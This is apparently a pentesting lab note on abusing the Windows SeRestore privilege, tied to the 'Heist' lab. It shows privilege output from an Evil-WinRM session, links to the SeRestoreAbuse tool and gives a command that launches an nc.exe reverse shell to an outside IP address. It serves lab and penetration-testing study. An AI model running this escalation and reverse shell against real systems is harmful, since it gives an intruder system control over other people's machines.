# SeRestore Privilege

### Initial Detection&#x20;

```
Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

{% embed url="https://github.com/xct/SeRestoreAbuse" %}

Build the code using Visual Studio Code 2022.&#x20;

Once compiled transfer nc.exe or your own payload.&#x20;

```
SeRestoreAbuse.exe "C:\Users\svc_apache$\Documents\nc.exe 192.168.49.105 1234 -e cmd.exe"
```

![](<../../../../.gitbook/assets/image (28).png>)

<details>

<summary>Examples of SeRestore Privilege Exploitation</summary>

[https://app.gitbook.com/s/8orEMrbW2JUz78N6Vl5G/priv-escalation](https://app.gitbook.com/s/8orEMrbW2JUz78N6Vl5G/priv-escalation) (Heist)

</details>
